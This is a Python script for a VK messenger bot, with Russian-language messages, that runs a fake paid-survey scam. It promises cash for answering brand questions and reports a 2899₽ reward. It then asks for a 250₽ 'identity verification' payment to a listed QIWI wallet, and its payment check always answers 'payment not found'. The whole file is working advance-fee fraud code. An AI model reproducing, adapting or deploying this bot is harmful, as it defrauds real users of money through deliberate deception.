import vk_api
import time
import os
import random
import json
import requests
from keyboards import *
headers = {'accept':'*/*',
           'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'}


token = os.environ.get('token')
vk = vk_api.VkApi(token=token)
vk._auth_token()
ranks = ['Новичок ', 'Любитель ①', 'Опытный Кликер ②', 'Профессиональный Кликер ③', 'Мастер ☆', 'Гранд-Мастер ☆☆', 'Величайший Кликер ☆☆☆', 'Элита ★','Легенда ★★','Властелин ★★★','Титан ☼','Верховный Титан ╰☆╮','Верховнй Кликер ☘','Легендарный Кликер ☝', 'Высший Ранг |✫|','Высший Ранг |✫✫|','Высший Ранг |✫✫✫|','Высший Ранг |✪|','Высший Ранг |✪✪|','Высший Ранг|✪✪✪|','Высший Ранг |⭐|','Высший Ранг |⭐⭐|','Высший Ранг |⭐⭐⭐|','Чемпион |🏆|','Чемпион |🏆🏆|','Чемпион |🏆🏆🏆|','Магистр |🌟|',
         'Магистр |🌟🌟|','Магистр |🌟🌟🌟|','Победитель |🏆🌟🏆|']
name = ''
eng = ''
interests = ''

def send_message(id,message,keyboard):
    vk.method("messages.send", {"peer_id": id, "keyboard": keyboard, "message": message, "random_id": random.randint(1, 2147483647)})

def get_button(label, color, payload=""):
    return {
        "action": {
            "type": "text",
            "payload": json.dumps(payload),
            "label": label
        },
        "color": color
    }





# У кнопок может быть один из 4 цветов:
# 1. primary — синяя кнопка, обозначает основное действие. #5181B8
# 2. default — обычная белая кнопка. #FFFFFF
# 3. negative — опасное действие, или отрицательное действие (отклонить, удалить и тд). #E64646
# 4. positive — согласиться, подтвердить. #4BB34B
ferst_step = ['apple', 'samsung', 'lg', 'huawei']
second_step = ['rolex','omega','breguet','longines']
third_step = ['xiaomi','thomas','karcher','philips']
f_step = ['skype','icq','discord','teamspeak3']

while True:
    try:
        messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
        if messages["count"] >= 1:
            id = messages["items"][0]["last_message"]["from_id"]
            body = messages ["items"][0]["last_message"]["text"]
            if body.lower() == "начать":
                send_message(id,'Добро пожаловать! Я бот-партнер больших компаний.\n🤖Я провожу опросы, за которые ты сможешь получить денежное вознаграждение💰\nЗачем мы платим деньги? Дело в том, что каждой крупной компании важны отзывы пользователей о продуктах. За это наш бот платит деньги💰💰💰. Проходишь опрос - получаешь деньги. Удачи!'
                                ,keyboard_start)
            if body.lower() == 'начать опрос':
                send_message(id,'Первый вопрос:\n\nКакую технику Вы предпочитаете?',keyboard_first)
            if body.lower() in ferst_step:
                send_message(id,'Спасибо! Продолжаем...\n\nКакую марку часов Вы предпочитаете?', keyboard_second)
            if body.lower() in second_step:
                send_message(id,'Спасибо! Продолжаем...\n\nКакой пылесос Вам более знаком?', keyboard_third)
            if body.lower() in third_step:
                send_message(id,'Спасибо! Продолжаем...\n\nКакая из этих программ Вам более знакома?', keyboard_fourth)
            if body.lower() in f_step:
                send_message(id,'Спасибо за прохождение опроса.\n\nВаше денежное вознаграждение: 2899₽', keyboard_withdraw)
            if body.lower() == 'получить средства':
                send_message(id,'Ошибка ⛔\n\nДля вывода Вам нужно подтвердить Вашу личность.\n\nПодтверждение личности требуется для того, чтобы каждый пользователь мог воспользоваться нашим ботом-опросником лишь один раз.', keyboard_verif)
            if body.lower() == 'подтвердить личность':
                send_message(id, 'Подтверждение личности♻\n\nПодтверждение личности является важной частью нашей акции. Если бы не было подтверждения личности - каждый пользователь мог бы проходить опрос много раз и получать вознаграждение, а это не честно. Для этого и нужно подтверждение личности.\n\n✅Для подтверждения личности Вам нужно:\n\n⚠ Оплатить 250₽ на данный QIWI-кошелек: +79647872316 ⚠\n\nПосле данной процедуры бот проверит, не проходил ли Ваш номер опрос до этого и Вам будет доступен вывод Ваших денег на Банковскую карту или QIWI-Кошелек',keyboard_check)
            if body.lower() == 'проверить оплату♻':
                send_message(id, 'Секунду, бот проверяет наличие Вашей оплаты...', keyboard_check)
                send_message(id,'Оплата не найдена⚠', keyboard_check)


    except:
        pass
